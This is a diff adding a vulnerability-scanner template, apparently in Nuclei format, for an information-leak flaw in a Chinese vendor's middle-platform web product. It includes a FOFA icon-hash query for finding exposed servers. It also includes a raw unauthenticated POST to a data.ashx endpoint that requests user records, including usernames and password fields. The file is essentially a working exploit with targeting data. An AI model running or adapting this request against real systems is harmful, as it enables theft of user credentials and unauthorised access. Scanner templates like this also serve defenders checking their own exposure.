@@ -1,0 +1,40 @@
+id: poc-ma95tqoq4vckofqn
+info:
+  name: 山东聚恒网络技术有限公司聚恒中台listdata存在敏感信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ma95tqoq4vckofqn'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ma95tqoq4vckofqn
+    fofa: icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"
+http:
+- raw:
+  - 'POST /sysplat/dataget/data.ashx?type=listdata&typeid=bs_webapiauthlist&listkey= HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Priority: u=0
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0
+
+    Accept: application/json, text/plain, */*
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie:
+
+    Content-Length: 274
+
+
+    typeid=bs_webapiauthlist&bsearch=1&binit=0&listkey=&limit=100&start=0&formid=&summarytype=client&summarycols=&selfields=id,cclientcode,cusercode,cusername,cuserpwd,cmemo&f3=&f1=&f2=&lockwhere='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
